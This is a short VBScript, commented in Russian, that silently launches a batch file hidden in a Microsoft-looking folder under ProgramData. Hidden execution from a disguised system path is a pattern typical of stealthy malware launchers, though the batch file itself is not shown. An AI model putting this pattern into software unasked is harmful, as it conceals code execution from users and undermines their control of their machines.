' Создать объект Shell
Dim objShell

' Инициализировать Shell
Set objShell = CreateObject("WScript.Shell")

' Установить путь к батнику
Dim batPath
batPath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\Main.bat"

' Запустить батник невидимо (асинхронно)
objShell.Run batPath, 0, False

' Удалить объект Shell
Set objShell = Nothing